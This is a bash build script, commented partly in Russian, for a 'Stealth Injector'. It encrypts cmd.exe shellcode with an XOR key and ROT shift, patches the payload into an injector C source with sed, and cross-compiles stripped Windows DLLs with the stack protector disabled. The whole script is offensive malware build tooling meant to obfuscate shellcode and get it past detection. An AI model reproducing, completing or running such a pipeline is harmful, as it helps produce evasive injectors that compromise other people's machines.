#!/bin/bash

echo "================================================"
echo "     Stealth Injector Build System"
echo "================================================"

# ================== НАСТРОЙКИ ==================
XOR_KEY="0x9F"
ROT_VALUE="5"
COMPILER="x86_64-w64-mingw32-gcc"
# ===============================================

echo "[+] Using XOR_KEY = $XOR_KEY, ROT_VALUE = $ROT_VALUE"

# Шифрование shellcode
echo "[+] Encrypting cmd.exe shellcode..."
python3 encrypt_shellcode.py "$XOR_KEY" "$ROT_VALUE" > encrypted_payload.h

# Автоматическая вставка в stealth_injector.c
echo "[+] Patching stealth_injector.c..."
sed -i '/=== ENCRYPTED PAYLOAD PLACEHOLDER ===/,/=== END PLACEHOLDER ===/c\#include "encrypted_payload.h"' stealth_injector.c

# Обновление ключей
sed -i "s/#define XOR_KEY .*/#define XOR_KEY $XOR_KEY/" stealth_injector.c
sed -i "s/#define ROT_VALUE .*/#define ROT_VALUE $ROT_VALUE/" stealth_injector.c

echo "[+] Compiling helper.dll..."
$COMPILER -shared -o helper.dll helper.c -Wl,--subsystem,windows -s -O2 -fPIC

echo "[+] Converting helper.dll to C array..."
python3 bin2c.py helper.dll > helper_data.h

echo "[+] Compiling stealth_injector.dll..."
$COMPILER -shared -o stealth_injector.dll stealth_injector.c -Wl,--subsystem,windows -s -O2 -fno-stack-protector

if [ -f stealth_injector.dll ]; then
    echo ""
    echo "================================================"
    echo "Build completed successfully!"
    echo "XOR_KEY = $XOR_KEY | ROT_VALUE = $ROT_VALUE"
    echo "Shellcode: cmd.exe (encrypted)"
    echo "================================================"
else
    echo "[-] Failed to compile stealth_injector.dll"
fi